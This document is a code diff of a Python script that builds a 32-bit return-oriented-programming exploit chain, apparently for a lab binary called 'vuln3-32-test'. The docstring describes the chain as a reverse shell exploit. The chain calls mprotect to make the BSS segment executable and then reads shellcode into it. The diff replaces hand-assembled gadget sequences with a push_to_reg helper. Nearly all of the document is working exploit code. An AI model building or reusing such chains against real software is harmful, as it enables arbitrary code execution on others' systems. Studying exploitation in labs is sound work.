@@ -1,14 +1,18 @@
-from address_pop import doubadd
-import junk_length_and_addresses
-import address_pop
-from struct import pack
 import sys
 from os import stat
+from struct import pack
+
+import address_pop
 import exploit_gadgets
+import junk_length_and_addresses
+from get_gadgets import get_gadgets, push_to_reg
 
 binary_name = "vuln3-32-test"
 
 rop = exploit_gadgets.ROPgadgets(binary_name)
+gadgets = get_gadgets(rop)
+    
+
 # Macro definitions for ROP Gadgets
 POPEAX    = pack('<I', rop.get_gadget("pop eax ; ret")) # pop eax ; ret
 POPEBX    = pack('<I', rop.get_gadget("pop ebx ; ret")) # pop ebx ; ret
@@ -32,7 +36,7 @@ NOP       = pack('<I', rop.get_gadget("nop ; ret")) # nop
 INT80     = pack('<I', rop.get_gadget("int 0x80 ; ret")) # int 0x80
 
 
-def rop_exploit(base_address):
+def rop_exploit():
     """Create the full ROP chain reverse shell exploit
 
     :param cli_args: The command line arguments
@@ -40,6 +44,7 @@ def rop_exploit(base_address):
     :return: The full ROP chain reverse shell exploit packed bytes sequence
     """
     (padding, data, bss) = junk_length_and_addresses.get_everything(binary_name)
+    
     # We need to align the BSS with the page size
     bss = (bss & 0xfffff000)
     print(f"{bss:x}")
@@ -47,30 +52,21 @@ def rop_exploit(base_address):
 
     shellcode_len = stat(sys.argv[1]).st_size
     
-    exploit += address_pop.doubadd(0x0000007D,ADDECXECX,INCECX)
-    exploit += XOREAX 
-    exploit += ADDEAXECX # syscall mprotect
-    exploit += address_pop.pop_reg(bss,POPEBX,0,INCEBX,"inc")
-
-    exploit += address_pop.pop_reg(0xffffffff,POPEDX,0,DECEDX,"dec")
-    exploit += INCEDX * 8
-    exploit += address_pop.doubadd(0x0000800,ADDECXECX,INCECX)
-    exploit += ADDECXECX
+    exploit += push_to_reg(0x0000800,"ecx",gadgets,rop)
+    exploit += push_to_reg(bss,"ebx",gadgets,rop)
+    exploit += push_to_reg(0x0000007D,"eax",gadgets,rop)    
+    exploit += push_to_reg(0x0000007,"edx",gadgets,rop)
     exploit += INT80 # int 0x80
+
+
 
 
     # BSS is now executable
     # # Read into BSS
-    exploit += XOREAX
-    exploit += INCEAX * 3 #Syscall Read
-    exploit += address_pop.pop_reg(bss,POPECXEBX,0,INCECX,"inc") #bss
-    exploit += INCECX # One of the incs is consumed by EBX
-    exploit += address_pop.pop_reg(0xffffffff,POPEBX,0,INCEBX,"inc")
-    exploit += INCEBX #stdin
-    exploit += address_pop.pop_reg(0xffffffff,POPEDX,0,DECEDX,"dec")
-    exploit += INCEDX
-    # Read 28 bytes
-    exploit += INCEDX * shellcode_len
+    exploit += push_to_reg(3,"eax",gadgets,rop)
+    exploit += push_to_reg(shellcode_len,"edx",gadgets,rop)
+    exploit += push_to_reg(bss,"ecx",gadgets,rop) #bss
+    exploit += gadgets.search("zero ebx")[0].gadget
 
     exploit += INT80
 
@@ -84,7 +80,7 @@ def rop_exploit(base_address):
 def test():
     fileName=input("Enter the file name: ")
     outfile=open(fileName, "wb")
-    outfile.write(rop_exploit(0x080da060))
+    outfile.write(rop_exploit())
     outfile.close()
 
 
